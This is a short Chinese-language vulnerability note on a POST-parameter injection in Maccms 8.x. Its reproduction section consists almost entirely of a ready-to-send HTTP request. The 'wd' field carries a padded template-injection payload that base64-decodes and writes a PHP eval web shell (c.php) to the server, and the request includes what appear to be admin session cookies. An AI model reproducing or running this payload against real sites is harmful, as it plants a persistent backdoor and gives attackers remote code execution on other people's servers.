Maccms 8.x post注入
===================

一、漏洞简介
------------

苹果cms 8.x 注入

二、漏洞影响
------------

Maccms 8.x

三、复现过程
------------

    POST /index.php?m=vod-search HTTP/1.1
    Host: 0-sec.org
    Content-Length: 500137
    Cache-Control: max-age=0
    Origin: http://word.o2oxy.cn
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://word.o2oxy.cn/index.php?m=vod-search
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: Hm_lvt_ff7f6fcad4e6116760e7b632f9614dc2=1574418087,1574670614,1574673402,1575271439; Hm_lvt_137ae1af30761db81edff2e16f0bf0f8=1574418087,1574670615,1574673402,1575275889; pgv_pvi=8322096128; PHPSESSID=pr37r8fkshd854f8fnfep4ov53; adminid=1; adminname=admin; adminlevels=b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck=2afdbd385cb6c2af162e6733f1b0e2d2
    Connection: close

    wd=uniona(这里a为80w个，可用Burp直接生成){if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A
